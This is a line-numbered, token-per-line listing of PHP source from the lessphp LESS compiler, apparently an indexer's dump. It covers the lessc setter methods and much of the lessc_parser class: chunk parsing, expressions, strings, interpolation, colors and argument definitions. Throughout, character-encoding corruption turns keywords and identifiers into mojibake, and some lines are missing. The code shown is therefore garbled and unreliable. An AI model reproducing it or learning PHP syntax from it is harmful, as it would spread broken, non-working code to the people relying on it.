	`is_¡ršg
(
$this
->
fÜm©‹rName
))

2048  
$this
->
fÜm©‹rName
;

2049 
$şassName
 = "lessc_formatter_$this->formatterName";

2052  
Ãw
 
$şassName
;

2053 
	}
}

2055 
public
 
funùiÚ
 
	$£tP»£rveComm’ts
(
$´e£rve
) {

2056 
$this
->
´e£rveComm’ts
 = 
$´e£rve
;

2057 
	}
}

2059 
public
 
funùiÚ
 
	$»gi¡”FunùiÚ
(
$Çme
, 
$func
) {

2060 
$this
->
libFunùiÚs
[
$Çme
] = 
$func
;

2061 
	}
}

2063 
public
 
funùiÚ
 
	$uÄegi¡”FunùiÚ
(
$Çme
) {

2064 
	`un£t
(
$this
->
libFunùiÚs
[
$Çme
]);

2065 
	}
}

2067 
public
 
funùiÚ
 
	$£tV¬ŸbËs
(
$v¬ŸbËs
) {

2068 
$this
->
»gi¡”edV¬s
 = 
	`¬¿y_m”ge
($this->»gi¡”edV¬s, 
$v¬ŸbËs
);

2069 
	}
}

2071 
public
 
funùiÚ
 
	$un£tV¬ŸbË
(
$Çme
) {

2072 
	`un£t
(
$this
->
»gi¡”edV¬s
[
$Çme
]);

2073 
	}
}

2075 
public
 
funùiÚ
 
	$£tImpÜtDœ
(
$dœs
) {

2076 
$this
->
impÜtDœ
 = (
¬¿y
)
$dœs
;

2077 
	}
}

2079 
public
 
funùiÚ
 
	$addImpÜtDœ
(
$dœ
) {

2080 
$this
->
impÜtDœ
 = (
¬¿y
)$this->importDir;

2081 
$this
->
impÜtDœ
[] = 
$dœ
;

2082 
	}
}

2084 
public
 
funùiÚ
 
	$®lP¬£dFes
() {

2085  
$this
->
®lP¬£dFes
;

2086 
	}
}

2088 
public
 
funùiÚ
 
	$addP¬£dFe
(
$fe
) {

2089 
$this
->
®lP¬£dFes
[
	`»®·th
(
$fe
)] = 
	`femtime
($file);

2090 
	}
}

2095 
public
 
funùiÚ
 
	$throwE¼Ü
(
$msg
 = 
nuÎ
) {

2096 ià(
$this
->
sourûLoc
 >= 0) {

2097 
$this
->
sourûP¬£r
->
	`throwE¼Ü
(
$msg
, $this->
sourûLoc
);

2099 
throw
 
Ãw
 
	`exû±iÚ
(
$msg
);

2100 
	}
}

2104 
public
 
funùiÚ
 
	$ccompe
(
$š
, 
$out
, 
$Ëss
 = 
nuÎ
) {

2105 ià(
$Ëss
 ==ğ
nuÎ
) {

2106 
$Ëss
 = 
Ãw
 
£lf
;

2108  
$Ëss
->
	`checkedCompe
(
$š
, 
$out
);

2109 
	}
}

2111 
public
 
funùiÚ
 
	$ûxecu‹
(
$š
, 
$fÜû
 = 
çl£
, 
$Ëss
 = 
nuÎ
) {

2112 ià(
$Ëss
 ==ğ
nuÎ
) {

2113 
$Ëss
 = 
Ãw
 
£lf
;

2115  
$Ëss
->
	`ÿchedCompe
(
$š
, 
$fÜû
);

2116 
	}
}

2118 
´Ùeùed
 
	g$cssCŞÜs
 = 
¬¿y
(

2272 şas 
	cËssc_·r£r
 {

2273 
´Ùeùed
 
	m$ÃxtBlockId
 = 0;

2275 
´Ùeùed
 
	m$´eûd’û
 = 
¬¿y
(

2289 
´Ùeùed
 
	m$wh™eP©‹º
;

2290 
´Ùeùed
 
	m$comm’tMuÉi
;

2292 
´Ùeùed
 
	m$comm’tSšgË
 = "//";

2293 
´Ùeùed
 
	m$comm’tMuÉiLeá
 = "/*";

2294 
´Ùeùed
 
	m$comm’tMuÉiRight
 = "*/";

2297 
´Ùeùed
 
	m$İ”©ÜSŒšg
;

2300 
´Ùeùed
 
	m$su´essDivisiÚPrİs
 =

2301 
¬¿y
('/border-radius$/i', '/^font$/i');

2303 
´Ùeùed
 
	m$blockDœeùives
 = 
¬¿y
("font-face", "keyframes", "page", "-moz-document", "viewport", "-moz-viewport", "-o-viewport", "-ms-viewport");

2304 
´Ùeùed
 
	m$lšeDœeùives
 = 
¬¿y
("charset");

2315 
´Ùeùed
 
	m$šP¬’s
 = 
çl£
;

2318 
´Ùeùed
 
	m$l™”®Cache
 = 
¬¿y
();

2320 
public
 
funùiÚ
 
	$__cÚ¡ruù
(
$Ëssc
, 
$sourûName
 = 
nuÎ
) {

2321 
$this
->
—tWh™eDeçuÉ
 = 
Œue
;

2323 
$this
->
Ëssc
 = 
$Ëssc
;

2325 
$this
->
sourûName
 = 
$sourûName
;

2327 
$this
->
wr™eComm’ts
 = 
çl£
;

2329 ià(!
£lf
::
$İ”©ÜSŒšg
) {

2330 
£lf
::
$İ”©ÜSŒšg
 =

2331 '('.
	`im¶ode
('|', 
	`¬¿y_m­
(
	`¬¿y
('lessc', 'preg_quote'),

2332 
	`¬¿y_keys
(
£lf
::
$´eûd’û
))).')';

2334 
$comm’tSšgË
 = 
Ëssc
::
	`´eg_quÙe
(
£lf
::$commentSingle);

2335 
$comm’tMuÉiLeá
 = 
Ëssc
::
	`´eg_quÙe
(
£lf
::$commentMultiLeft);

2336 
$comm’tMuÉiRight
 = 
Ëssc
::
	`´eg_quÙe
(
£lf
::$commentMultiRight);

2338 
£lf
::
$comm’tMuÉi
 = 
$comm’tMuÉiLeá
.'.*?'.
$comm’tMuÉiRight
;

2339 
£lf
::
$wh™eP©‹º
 = '/'.
$comm’tSšgË
.'[^\n]*\s*|('.£lf::
$comm’tMuÉi
.')\s*|\s+/Ais';

2343 
public
 
funùiÚ
 
	$·r£
(
$bufãr
) {

2344 
$this
->
couÁ
 = 0;

2345 
$this
->
lše
 = 1;

2347 
$this
->
’v
 = 
nuÎ
;

2348 
$this
->
bufãr
 = $this->
wr™eComm’ts
 ? 
$bufãr
 : $this->
	`»moveComm’ts
($buffer);

2349 
$this
->
	`pushS³cŸlBlock
("root");

2350 
$this
->
—tWh™eDeçuÉ
 = 
Œue
;

2351 
$this
->
£’Comm’ts
 = 
	`¬¿y
();

2358 
$this
->
	`wh™e¥aû
();

2361 
çl£
 !=ğ
$this
->
	`·r£Chunk
());

2363 ià(
$this
->
couÁ
 !ğ
	`¡¾’
($this->
bufãr
))

2364 
$this
->
	`throwE¼Ü
();

2367 iàĞ!
	`´İ”ty_exi¡s
(
$this
->
’v
, '·»Á'è|| !
	`is_nuÎ
($this->’v->
·»Á
) )

2368 
throw
 
Ãw
 
	`exû±iÚ
('parseƒrror: unclosed block');

2370  
$this
->
’v
;

2371 
	}
}

2409 
´Ùeùed
 
funùiÚ
 
	$·r£Chunk
() {

2410 ià(
	`em±y
(
$this
->
bufãr
)è 
çl£
;

2411 
$s
 = 
$this
->
	`£ek
();

2413 ià(
$this
->
	`wh™e¥aû
()) {

2414  
Œue
;

2418 ià(
$this
->
	`keywÜd
(
$key
è&& $this->
	`assign
() &&

2419 
$this
->
	`´İ”tyV®ue
(
$v®ue
, 
$key
è&& $this->
	`’d
())

2421 
$this
->
	`­³nd
(
	`¬¿y
('assign', 
$key
, 
$v®ue
), 
$s
);

2422  
Œue
;

2424 
$this
->
	`£ek
(
$s
);

2429 ià(
$this
->
	`l™”®
('@', 
çl£
)) {

2430 
$this
->
couÁ
--;

2433 ià(
$this
->
	`l™”®
('@media')) {

2434 ià((
$this
->
	`medŸQu”yLi¡
(
$medŸQu”›s
è|| 
Œue
)

2435 && 
$this
->
	`l™”®
('{'))

2437 
$medŸ
 = 
$this
->
	`pushS³cŸlBlock
("media");

2438 
$medŸ
->
qu”›s
 = 
	`is_nuÎ
(
$medŸQu”›s
è? 
	`¬¿y
() : $mediaQueries;

2439  
Œue
;

2441 
$this
->
	`£ek
(
$s
);

2442  
çl£
;

2446 ià(
$this
->
	`l™”®
("@", 
çl£
è&& $this->
	`keywÜd
(
$dœName
)) {

2447 ià(
$this
->
	`isDœeùive
(
$dœName
, $this->
blockDœeùives
)) {

2448 ià((
$this
->
	`İ’SŒšg
("{", 
$dœV®ue
, 
nuÎ
, 
	`¬¿y
(";")è|| 
Œue
) &&

2449 
$this
->
	`l™”®
("{"))

2451 
$dœ
 = 
$this
->
	`pushS³cŸlBlock
("directive");

2452 
$dœ
->
Çme
 = 
$dœName
;

2453 ià(
	`is£t
(
$dœV®ue
)è
$dœ
->
v®ue
 = $dirValue;

2454  
Œue
;

2456 } 
	`–£if
 (
$this
->
	`isDœeùive
(
$dœName
, $this->
lšeDœeùives
)) {

2457 ià(
$this
->
	`´İ”tyV®ue
(
$dœV®ue
è&& $this->
	`’d
()) {

2458 
$this
->
	`­³nd
(
	`¬¿y
("dœeùive", 
$dœName
, 
$dœV®ue
));

2459  
Œue
;

2464 
$this
->
	`£ek
(
$s
);

2468 ià(
$this
->
	`v¬ŸbË
(
$v¬
è&& $this->
	`assign
() &&

2469 
$this
->
	`´İ”tyV®ue
(
$v®ue
è&& $this->
	`’d
())

2471 
$this
->
	`­³nd
(
	`¬¿y
('assign', 
$v¬
, 
$v®ue
), 
$s
);

2472  
Œue
;

2474 
$this
->
	`£ek
(
$s
);

2477 ià(
$this
->
	`impÜt
(
$impÜtV®ue
)) {

2478 
$this
->
	`­³nd
(
$impÜtV®ue
, 
$s
);

2479  
Œue
;

2483 ià(
$this
->
	`g
(
$g
, 
Œue
è&& $this->
	`¬gum’tDef
(
$¬gs
, 
$isV¬¬g
) &&

2484 (
$this
->
	`gu¬ds
(
$gu¬ds
è|| 
Œue
) &&

2485 
$this
->
	`l™”®
('{'))

2487 
$block
 = 
$this
->
	`pushBlock
($this->
	`fixTags
(
	`¬¿y
(
$g
)));

2488 
$block
->
¬gs
 = 
$¬gs
;

2489 
$block
->
isV¬¬g
 = 
$isV¬¬g
;

2490 ià(!
	`em±y
(
$gu¬ds
)è
$block
->
gu¬ds
 = $guards;

2491  
Œue
;

2493 
$this
->
	`£ek
(
$s
);

2497 ià(
$this
->
	`gs
(
$gs
è&& $this->
	`l™”®
('{', 
çl£
)) {

2498 
$gs
 = 
$this
->
	`fixTags
($tags);

2499 
$this
->
	`pushBlock
(
$gs
);

2500  
Œue
;

2502 
$this
->
	`£ek
(
$s
);

2506 ià(
$this
->
	`l™”®
('}', 
çl£
)) {

2507 
Œy
 {

2508 
$block
 = 
$this
->
	`pİ
();

2509 } 
	`ÿtch
 (
exû±iÚ
 
$e
) {

2510 
$this
->
	`£ek
(
$s
);

2511 
$this
->
	`throwE¼Ü
(
$e
->
	`g‘Mes§ge
());

2514 
$hidd’
 = 
çl£
;

2515 ià(
	`is_nuÎ
(
$block
->
ty³
)) {

2516 
$hidd’
 = 
Œue
;

2517 ià(!
	`is£t
(
$block
->
¬gs
)) {

2518 
	`fÜ—ch
 (
$block
->
gs
 
as
 
$g
) {

2519 ià(!
	`is_¡ršg
(
$g
è|| $g{0} !ğ
$this
->
Ëssc
->
mP»fix
) {

2520 
$hidd’
 = 
çl£
;

2526 
	`fÜ—ch
 (
$block
->
gs
 
as
 
$g
) {

2527 ià(
	`is_¡ršg
(
$g
)) {

2528 
$this
->
’v
->
chd»n
[
$g
][] = 
$block
;

2533 ià(!
$hidd’
) {

2534 
$this
->
	`­³nd
(
	`¬¿y
('block', 
$block
), 
$s
);

2539 
$this
->
	`wh™e¥aû
();

2540  
Œue
;

2544 ià(
$this
->
	`mixšTags
(
$gs
) &&

2545 (
$this
->
	`¬gum’tDef
(
$¬gv
, 
$isV¬¬g
è|| 
Œue
) &&

2546 (
$this
->
	`keywÜd
(
$suffix
è|| 
Œue
è&& $this->
	`’d
())

2548 
$gs
 = 
$this
->
	`fixTags
($tags);

2549 
$this
->
	`­³nd
(
	`¬¿y
('mixš', 
$gs
, 
$¬gv
, 
$suffix
), 
$s
);

2550  
Œue
;

2552 
$this
->
	`£ek
(
$s
);

2556 ià(
$this
->
	`l™”®
(';')è 
Œue
;

2558  
çl£
;

2559 
	}
}

2561 
´Ùeùed
 
funùiÚ
 
	$isDœeùive
(
$dœÇme
, 
$dœeùives
) {

2563 
$·‰”n
 = 
	`im¶ode
("|",

2564 
	`¬¿y_m­
(
	`¬¿y
("Ëssc", "´eg_quÙe"), 
$dœeùives
));

2565 
$·‰”n
 = '/^(-[a-z-]+-)?(' . $pattern . ')$/i';

2567  
	`´eg_m©ch
(
$·‰”n
, 
$dœÇme
);

2568 
	}
}

2570 
´Ùeùed
 
funùiÚ
 
	$fixTags
(
$gs
) {

2572 
	`fÜ—ch
 (
$gs
 
as
 &
$g
) {

2573 ià(
$g
{0} =ğ
$this
->
Ëssc
->
vP»fix
)

2574 
$g
[0] = 
$this
->
Ëssc
->
mP»fix
;

2576  
$gs
;

2577 
	}
}

2580 
´Ùeùed
 
funùiÚ
 
	$ex´essiÚLi¡
(&
$exps
) {

2581 
$v®ues
 = 
	`¬¿y
();

2583 
$this
->
	`ex´essiÚ
(
$exp
)) {

2584 
$v®ues
[] = 
$exp
;

2587 ià(
	`couÁ
(
$v®ues
è=ğ0è 
çl£
;

2589 
$exps
 = 
Ëssc
::
	`com´essLi¡
(
$v®ues
, ' ');

2590  
Œue
;

2591 
	}
}

2597 
´Ùeùed
 
funùiÚ
 
	$ex´essiÚ
(&
$out
) {

2598 ià(
$this
->
	`v®ue
(
$lhs
)) {

2599 
$out
 = 
$this
->
	`expH–³r
(
$lhs
, 0);

2602 ià(!
	`em±y
(
$this
->
’v
->
su´es£dDivisiÚ
)) {

2603 
	`un£t
(
$this
->
’v
->
su´es£dDivisiÚ
);

2604 
$s
 = 
$this
->
	`£ek
();

2605 ià(
$this
->
	`l™”®
("/"è&& $this->
	`v®ue
(
$rhs
)) {

2606 
$out
 = 
	`¬¿y
("list", "",

2607 
	`¬¿y
(
$out
,‡¼ay("keywÜd", "/"), 
$rhs
));

2609 
$this
->
	`£ek
(
$s
);

2613  
Œue
;

2615  
çl£
;

2616 
	}
}

2621 
´Ùeùed
 
funùiÚ
 
	$expH–³r
(
$lhs
, 
$mšP
) {

2622 
$this
->
šExp
 = 
Œue
;

2623 
$ss
 = 
$this
->
	`£ek
();

2625 
Œue
) {

2626 
$wh™eBefÜe
 = 
	`is£t
(
$this
->
bufãr
[$this->
couÁ
 - 1]) &&

2627 
	`ùy³_¥aû
(
$this
->
bufãr
[$this->
couÁ
 - 1]);

2631 
$ÃedWh™e
 = 
$wh™eBefÜe
 && !
$this
->
šP¬’s
;

2633 ià(
$this
->
	`m©ch
(
£lf
::
$İ”©ÜSŒšg
.(
$ÃedWh™e
 ? '\s' : ''), 
$m
è&& s–f::
$´eûd’û
[$m[1]] >ğ
$mšP
) {

2634 ià(!
$this
->
šP¬’s
 && 
	`is£t
($this->
’v
->
cu¼’tPrİ”ty
è&& 
$m
[1] =ğ"/" && 
	`em±y
($this->’v->
su´es£dDivisiÚ
)) {

2635 
	`fÜ—ch
 (
£lf
::
$su´essDivisiÚPrİs
 
as
 
$·‰”n
) {

2636 ià(
	`´eg_m©ch
(
$·‰”n
, 
$this
->
’v
->
cu¼’tPrİ”ty
)) {

2637 
$this
->
’v
->
su´es£dDivisiÚ
 = 
Œue
;

2644 
$wh™eAá”
 = 
	`is£t
(
$this
->
bufãr
[$this->
couÁ
 - 1]) &&

2645 
	`ùy³_¥aû
(
$this
->
bufãr
[$this->
couÁ
 - 1]);

2647 ià(!
$this
->
	`v®ue
(
$rhs
)) ;

2650 ià(
$this
->
	`³ek
(
£lf
::
$İ”©ÜSŒšg
, 
$Ãxt
è&& s–f::
$´eûd’û
[$Ãxt[1]] > s–f::$´eûd’û[
$m
[1]]) {

2651 
$rhs
 = 
$this
->
	`expH–³r
($rhs, 
£lf
::
$´eûd’û
[
$Ãxt
[1]]);

2654 
$lhs
 = 
	`¬¿y
('ex´essiÚ', 
$m
[1], $lhs, 
$rhs
, 
$wh™eBefÜe
, 
$wh™eAá”
);

2655 
$ss
 = 
$this
->
	`£ek
();

2663 
$this
->
	`£ek
(
$ss
);

2665  
$lhs
;

2666 
	}
}

2669 
public
 
funùiÚ
 
	$´İ”tyV®ue
(&
$v®ue
, 
$keyName
 = 
nuÎ
) {

2670 
$v®ues
 = 
	`¬¿y
();

2672 ià(
$keyName
 !=ğ
nuÎ
è
$this
->
’v
->
cu¼’tPrİ”ty
 = $keyName;

2674 
$s
 = 
nuÎ
;

2675 
$this
->
	`ex´essiÚLi¡
(
$v
)) {

2676 
$v®ues
[] = 
$v
;

2677 
$s
 = 
$this
->
	`£ek
();

2678 ià(!
$this
->
	`l™”®
(',')) ;

2681 ià(
$s
è
$this
->
	`£ek
($s);

2683 ià(
$keyName
 !=ğ
nuÎ
è
	`un£t
(
$this
->
’v
->
cu¼’tPrİ”ty
);

2685 ià(
	`couÁ
(
$v®ues
è=ğ0è 
çl£
;

2687 
$v®ue
 = 
Ëssc
::
	`com´essLi¡
(
$v®ues
, ', ');

2688  
Œue
;

2689 
	}
}

2691 
´Ùeùed
 
funùiÚ
 
	$·»nV®ue
(&
$out
) {

2692 
$s
 = 
$this
->
	`£ek
();

2695 ià(
	`is£t
(
$this
->
bufãr
[$this->
couÁ
]) && $this->buffer[$this->count] != "(") {

2696  
çl£
;

2699 
$šP¬’s
 = 
$this
->
šP¬’s
;

2700 ià(
$this
->
	`l™”®
("(") &&

2701 (
$this
->
šP¬’s
 = 
Œue
è&& $this->
	`ex´essiÚ
(
$exp
) &&

2702 
$this
->
	`l™”®
(")"))

2704 
$out
 = 
$exp
;

2705 
$this
->
šP¬’s
 = 
$šP¬’s
;

2706  
Œue
;

2708 
$this
->
šP¬’s
 = 
$šP¬’s
;

2709 
$this
->
	`£ek
(
$s
);

2712  
çl£
;

2713 
	}
}

2716 
´Ùeùed
 
funùiÚ
 
	$v®ue
(&
$v®ue
) {

2717 
$s
 = 
$this
->
	`£ek
();

2720 ià(
	`is£t
(
$this
->
bufãr
[$this->
couÁ
]) && $this->buffer[$this->count] == "-") {

2722 ià(
$this
->
	`l™”®
("-", 
çl£
) &&

2723 ((
$this
->
	`v¬ŸbË
(
$šÃr
è&& $šÃ¸ğ
	`¬¿y
("variable", $inner)) ||

2724 
$this
->
	`un™
(
$šÃr
) ||

2725 
$this
->
	`·»nV®ue
(
$šÃr
)))

2727 
$v®ue
 = 
	`¬¿y
("uÇry", "-", 
$šÃr
);

2728  
Œue
;

2730 
$this
->
	`£ek
(
$s
);

2734 ià(
$this
->
	`·»nV®ue
(
$v®ue
)è 
Œue
;

2735 ià(
$this
->
	`un™
(
$v®ue
)è 
Œue
;

2736 ià(
$this
->
	`cŞÜ
(
$v®ue
)è 
Œue
;

2737 ià(
$this
->
	`func
(
$v®ue
)è 
Œue
;

2738 ià(
$this
->
	`¡ršg
(
$v®ue
)è 
Œue
;

2740 ià(
$this
->
	`keywÜd
(
$wÜd
)) {

2741 
$v®ue
 = 
	`¬¿y
('keywÜd', 
$wÜd
);

2742  
Œue
;

2746 ià(
$this
->
	`v¬ŸbË
(
$v¬
)) {

2747 
$v®ue
 = 
	`¬¿y
('v¬ŸbË', 
$v¬
);

2748  
Œue
;

2752 ià(
$this
->
	`l™”®
("~"è&& $this->
	`¡ršg
(
$¡r
)) {

2753 
$v®ue
 = 
	`¬¿y
("esÿ³", 
$¡r
);

2754  
Œue
;

2756 
$this
->
	`£ek
(
$s
);

2760 ià(
$this
->
	`l™”®
('\\'è&& $this->
	`m©ch
('([0-9]+)', 
$m
)) {

2761 
$v®ue
 = 
	`¬¿y
('keywÜd', '\\'.
$m
[1]);

2762  
Œue
;

2764 
$this
->
	`£ek
(
$s
);

2767  
çl£
;

2768 
	}
}

2771 
´Ùeùed
 
funùiÚ
 
	$impÜt
(&
$out
) {

2772 ià(!
$this
->
	`l™”®
('@impÜt')è 
çl£
;

2778 ià(
$this
->
	`´İ”tyV®ue
(
$v®ue
)) {

2779 
$out
 = 
	`¬¿y
("impÜt", 
$v®ue
);

2780  
Œue
;

2782 
	}
}

2784 
´Ùeùed
 
funùiÚ
 
	$medŸQu”yLi¡
(&
$out
) {

2785 ià(
$this
->
	`g’”icLi¡
(
$li¡
, "medŸQu”y", ",", 
çl£
)) {

2786 
$out
 = 
$li¡
[2];

2787  
Œue
;

2789  
çl£
;

2790 
	}
}

2792 
´Ùeùed
 
funùiÚ
 
	$medŸQu”y
(&
$out
) {

2793 
$s
 = 
$this
->
	`£ek
();

2795 
$ex´essiÚs
 = 
nuÎ
;

2796 
$·¹s
 = 
	`¬¿y
();

2798 ià((
$this
->
	`l™”®
("Úly"è&& (
$Úly
 = 
Œue
è|| $this->l™”®("nÙ"è&& (
$nÙ
 =rueè||rueè&& $this->
	`keywÜd
(
$medŸTy³
)) {

2799 
$´İ
 = 
	`¬¿y
("mediaType");

2800 ià(
	`is£t
(
$Úly
)è
$´İ
[] = "only";

2801 ià(
	`is£t
(
$nÙ
)è
$´İ
[] = "not";

2802 
$´İ
[] = 
$medŸTy³
;

2803 
$·¹s
[] = 
$´İ
;

2805 
$this
->
	`£ek
(
$s
);

2809 ià(!
	`em±y
(
$medŸTy³
è&& !
$this
->
	`l™”®
("and")) {

2812 
$this
->
	`g’”icLi¡
(
$ex´essiÚs
, "medŸEx´essiÚ", "ªd", 
çl£
);

2813 ià(
	`is_¬¿y
(
$ex´essiÚs
)è
$·¹s
 = 
	`¬¿y_m”ge
($parts, $expressions[2]);

2816 ià(
	`couÁ
(
$·¹s
) == 0) {

2817 
$this
->
	`£ek
(
$s
);

2818  
çl£
;

2821 
$out
 = 
$·¹s
;

2822  
Œue
;

2823 
	}
}

2825 
´Ùeùed
 
funùiÚ
 
	$medŸEx´essiÚ
(&
$out
) {

2826 
$s
 = 
$this
->
	`£ek
();

2827 
$v®ue
 = 
nuÎ
;

2828 ià(
$this
->
	`l™”®
("(") &&

2829 
$this
->
	`keywÜd
(
$ã©u»
) &&

2830 (
$this
->
	`l™”®
(":"è&& $this->
	`ex´essiÚ
(
$v®ue
è|| 
Œue
) &&

2831 
$this
->
	`l™”®
(")"))

2833 
$out
 = 
	`¬¿y
("medŸExp", 
$ã©u»
);

2834 ià(
$v®ue
è
$out
[] = $value;

2835  
Œue
;

2836 } 
	`–£if
 (
$this
->
	`v¬ŸbË
(
$v¬ŸbË
)) {

2837 
$out
 = 
	`¬¿y
('v¬ŸbË', 
$v¬ŸbË
);

2838  
Œue
;

2841 
$this
->
	`£ek
(
$s
);

2842  
çl£
;

2843 
	}
}

2846 
´Ùeùed
 
funùiÚ
 
	$İ’SŒšg
(
$’d
, &
$out
, 
$Ã¡šgO³n
=
nuÎ
, 
$»jeùSŒs
 =‚ull) {

2847 
$ŞdWh™e
 = 
$this
->
—tWh™eDeçuÉ
;

2848 
$this
->
—tWh™eDeçuÉ
 = 
çl£
;

2850 
$¡İ
 = 
	`¬¿y
("'", '"', "@{", 
$’d
);

2851 
$¡İ
 = 
	`¬¿y_m­
(
	`¬¿y
("lessc", "preg_quote"), $stop);

2854 ià(!
	`is_nuÎ
(
$»jeùSŒs
)) {

2855 
$¡İ
 = 
	`¬¿y_m”ge
($¡İ, 
$»jeùSŒs
);

2858 
$·‰
 = '(.*?)('.
	`im¶ode
("|", 
$¡İ
).')';

2860 
$Ã¡šgLev–
 = 0;

2862 
$cÚ‹Á
 = 
	`¬¿y
();

2863 
$this
->
	`m©ch
(
$·‰
, 
$m
, 
çl£
)) {

2864 ià(!
	`em±y
(
$m
[1])) {

2865 
$cÚ‹Á
[] = 
$m
[1];

2866 ià(
$Ã¡šgO³n
) {

2867 
$Ã¡šgLev–
 +ğ
	`sub¡r_couÁ
(
$m
[1], 
$Ã¡šgO³n
);

2871 
$tok
 = 
$m
[2];

2873 
$this
->
couÁ
-ğ
	`¡¾’
(
$tok
);

2874 ià(
$tok
 =ğ
$’d
) {

2875 ià(
$Ã¡šgLev–
 == 0) {

2878 
$Ã¡šgLev–
--;

2882 ià((
$tok
 =ğ"'" || $tok =ğ'"'è&& 
$this
->
	`¡ršg
(
$¡r
)) {

2883 
$cÚ‹Á
[] = 
$¡r
;

2887 ià(
$tok
 =ğ"@{" && 
$this
->
	`š‹½Ş©iÚ
(
$š‹r
)) {

2888 
$cÚ‹Á
[] = 
$š‹r
;

2892 ià(!
	`em±y
(
$»jeùSŒs
è&& 
	`š_¬¿y
(
$tok
, $rejectStrs)) {

2896 
$cÚ‹Á
[] = 
$tok
;

2897 
$this
->
couÁ
+ğ
	`¡¾’
(
$tok
);

2900 
$this
->
—tWh™eDeçuÉ
 = 
$ŞdWh™e
;

2902 ià(
	`couÁ
(
$cÚ‹Á
è=ğ0è 
çl£
;

2905 ià(
	`is_¡ršg
(
	`’d
(
$cÚ‹Á
))) {

2906 
$cÚ‹Á
[
	`couÁ
($cÚ‹Áè- 1] = 
	`¹rim
(
	`’d
($content));

2909 
$out
 = 
	`¬¿y
("¡ršg", "", 
$cÚ‹Á
);

2910  
Œue
;

2911 
	}
}

2913 
´Ùeùed
 
funùiÚ
 
	$¡ršg
(&
$out
) {

2914 
$s
 = 
$this
->
	`£ek
();

2915 ià(
$this
->
	`l™”®
('"', 
çl£
)) {

2916 
$d–im
 = '"';

2917 } 
	`–£if
 (
$this
->
	`l™”®
("'", 
çl£
)) {

2918 
$d–im
 = "'";

2920  
çl£
;

2923 
$cÚ‹Á
 = 
	`¬¿y
();

2926 
$·‰
 = '([^\n]*?)(@\{|\\\\|' .

2927 
Ëssc
::
	`´eg_quÙe
(
$d–im
).')';

2929 
$ŞdWh™e
 = 
$this
->
—tWh™eDeçuÉ
;

2930 
$this
->
—tWh™eDeçuÉ
 = 
çl£
;

2932 
$this
->
	`m©ch
(
$·‰
, 
$m
, 
çl£
)) {

2933 
$cÚ‹Á
[] = 
$m
[1];

2934 ià(
$m
[2] == "@{") {

2935 
$this
->
couÁ
 -ğ
	`¡¾’
(
$m
[2]);

2936 ià(
$this
->
	`š‹½Ş©iÚ
(
$š‹r
, 
çl£
)) {

2937 
$cÚ‹Á
[] = 
$š‹r
;

2939 
$this
->
couÁ
 +ğ
	`¡¾’
(
$m
[2]);

2940 
$cÚ‹Á
[] = "@{";

2942 } 
	`–£if
 (
$m
[2] == '\\') {

2943 
$cÚ‹Á
[] = 
$m
[2];

2944 ià(
$this
->
	`l™”®
(
$d–im
, 
çl£
)) {

2945 
$cÚ‹Á
[] = 
$d–im
;

2948 
$this
->
couÁ
 -ğ
	`¡¾’
(
$d–im
);

2953 
$this
->
—tWh™eDeçuÉ
 = 
$ŞdWh™e
;

2955 ià(
$this
->
	`l™”®
(
$d–im
)) {

2956 
$out
 = 
	`¬¿y
("¡ršg", 
$d–im
, 
$cÚ‹Á
);

2957  
Œue
;

2960 
$this
->
	`£ek
(
$s
);

2961  
çl£
;

2962 
	}
}

2964 
´Ùeùed
 
funùiÚ
 
	$š‹½Ş©iÚ
(&
$out
) {

2965 
$ŞdWh™e
 = 
$this
->
—tWh™eDeçuÉ
;

2966 
$this
->
—tWh™eDeçuÉ
 = 
Œue
;

2968 
$s
 = 
$this
->
	`£ek
();

2969 ià(
$this
->
	`l™”®
("@{") &&

2970 
$this
->
	`İ’SŒšg
("}", 
$š‹½
, 
nuÎ
, 
	`¬¿y
("'", '"', ";")) &&

2971 
$this
->
	`l™”®
("}", 
çl£
))

2973 
$out
 = 
	`¬¿y
("š‹½Ş©e", 
$š‹½
);

2974 
$this
->
—tWh™eDeçuÉ
 = 
$ŞdWh™e
;

2975 ià(
$this
->
—tWh™eDeçuÉ
è$this->
	`wh™e¥aû
();

2976  
Œue
;

2979 
$this
->
—tWh™eDeçuÉ
 = 
$ŞdWh™e
;

2980 
$this
->
	`£ek
(
$s
);

2981  
çl£
;

2982 
	}
}

2984 
´Ùeùed
 
funùiÚ
 
	$un™
(&
$un™
) {

2986 ià(
	`is£t
(
$this
->
bufãr
[$this->
couÁ
])) {

2987 
$ch¬
 = 
$this
->
bufãr
[$this->
couÁ
];

2988 ià(!
	`ùy³_dig™
(
$ch¬
è&& $ch¬ !ğ"."è 
çl£
;

2991 ià(
$this
->
	`m©ch
('([0-9]+(?:\.[0-9]*)?|\.[0-9]+)([%a-zA-Z]+)?', 
$m
)) {

2992 
$un™
 = 
	`¬¿y
("numb”", 
$m
[1], 
	`em±y
($m[2]) ? "" : $m[2]);

2993  
Œue
;

2995  
çl£
;

2996 
	}
}

2999 
´Ùeùed
 
funùiÚ
 
	$cŞÜ
(&
$out
) {

3000 ià(
$this
->
	`m©ch
('(#(?:[0-9a-f]{8}|[0-9a-f]{6}|[0-9a-f]{3}))', 
$m
)) {

3001 ià(
	`¡¾’
(
$m
[1]) > 7) {

3002 
$out
 = 
	`¬¿y
("¡ršg", "",‡¼ay(
$m
[1]));

3004 
$out
 = 
	`¬¿y
("¿w_cŞÜ", 
$m
[1]);

3006  
Œue
;

3009  
çl£
;

3010 
	}
}

3017 
´Ùeùed
 
funùiÚ
 
	$¬gum’tDef
(&
$¬gs
, &
$isV¬¬g
) {

3018 
$s
 = 
$this
->
	`£ek
();

3019 ià(!
$this
->
	`l™”®
('(')è 
çl£
;

3021 
$v®ues
 = 
	`¬¿y
();

3022 
$d–im
 = ",";

3023 
$m‘hod
 = "expressionList";

3025 
$isV¬¬g
 = 
çl£
;

3026 
Œue
) {

3027 ià(
$this
->
	`l™”®
("...")) {

3028 
$isV¬¬g
 = 
Œue
;

3032 ià(
$this
->
	`$m‘hod
(
$v®ue
)) {

3033 ià(
$v®ue
[0] == "variable") {

3034 
$¬g
 = 
	`¬¿y
("¬g", 
$v®ue
[1]);

3035 
$ss
 = 
$this
->
	`£ek
();

3037 ià(
$this
->
	`assign
(è&& $this->
	`$m‘hod
(
$rhs
)) {

3038 
$¬g
[] = 
$rhs
;

3040 
$this
->
	`£ek
(
$ss
);

3041 ià(
$this
->
	`l™”®
("...")) {

3042 
$¬g
[0] = "rest";

3043 
$isV¬¬g
 = 
Œue
;

3047 
$v®ues
[] = 
$¬g
;

3048 ià(
$isV¬¬g
) ;

3051 
$v®ues
[] = 
	`¬¿y
("l™", 
$v®ue
);

3056 ià(!
$this
->
	`l™”®
(
$d–im
)) {

